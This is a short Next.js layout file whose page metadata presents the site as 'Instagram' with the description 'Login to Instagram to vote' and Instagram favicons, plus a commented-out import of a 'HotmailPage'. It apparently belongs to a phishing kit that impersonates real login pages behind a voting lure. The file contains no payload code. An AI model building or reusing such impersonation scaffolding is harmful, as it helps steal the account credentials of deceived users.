// import HotmailPage from "../hotmail/page";

export const metadata = {
  title: "Instagram",
  description: "Login to Instagram to vote",

  icons: {
    icon: [
      {
        url: "/instagram_favicon.png",
      },
    ],
    shortcut: ["/instagram_favicon.png"],
    apple: [
      {
        url: "/instagram_favicon.png",
      },
      {
        url: "/instagram_favicon.png",
        sizes: "180x180",
        type: "image/avif",
      },
    ],
  },
};

export default function RootLayout({ children }) {
  return <main>{children}</main>;
}
